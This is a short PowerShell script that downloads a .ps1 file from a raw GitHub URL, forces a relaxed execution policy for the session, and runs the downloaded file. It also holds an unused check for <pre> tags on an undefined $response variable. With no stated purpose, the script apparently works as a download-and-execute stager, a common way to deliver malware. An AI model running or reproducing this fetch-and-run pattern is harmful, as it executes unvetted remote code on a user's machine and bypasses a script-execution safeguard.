
$url = "https://raw.githubusercontent.com/folibony78-boop/cxcxz/refs/heads/main/code4.ps1"
$output = "code43.ps1"


if ($response.Content -match '<pre[^>]*>(.*?)</pre>') {
    $preContent = $matches[1]
    Write-Host "Content found in <pre> tags:"
    Write-Host $preContent
}

 
Invoke-WebRequest -Uri $url -OutFile $output

 
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope Process -Force

 
.\code43.ps1


 